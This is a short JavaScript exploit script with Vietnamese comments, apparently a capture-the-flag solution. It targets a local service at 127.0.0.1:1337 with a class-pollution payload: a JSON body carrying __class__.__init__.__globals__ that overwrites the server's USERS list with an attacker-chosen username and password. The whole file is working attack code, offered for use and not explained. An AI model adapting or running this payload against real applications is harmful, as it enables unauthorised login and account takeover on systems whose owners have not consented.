// Gửi yêu cầu GET đến /get_tornados
fetch('http://127.0.0.1:1337/get_tornados')
    .then(response => response.json()) // Chuyển đổi phản hồi sang JSON
    .then(machines => {
        // Lấy machine_id của máy đầu tiên từ phản hồi
        let firstMachine = machines[0].machine_id;

        // Tạo đối tượng JSON để gửi trong POST request
        let json = {
            "machine_id": firstMachine,
            "status": "active",
            "__class__": {
                "__init__": {
                    "__globals__": {
                        "USERS": [
                            {
                                "username": "wanthinnn", 
                                "password": "wanthinnn"  
                            }
                        ]
                    }
                }
            }
        };

        // Gửi yêu cầu POST đến /update_tornado
        return fetch('http://127.0.0.1:1337/update_tornado', {
            method: "POST", // Sử dụng phương thức POST
            mode: "cors",   // Chế độ cors
            headers: {
                "Content-Type": "application/json" // Định dạng nội dung là JSON
            },
            body: JSON.stringify(json) // Chuyển đối tượng JSON thành chuỗi
        });
    })
    .then(response => response.json()) // Chuyển đổi phản hồi của POST request sang JSON
    .then(data => {
        console.log('Response from update_tornado:', data); // In kết quả ra console
    })
    .catch(error => {
        console.error('Error:', error); // Bắt lỗi và in ra console
    });
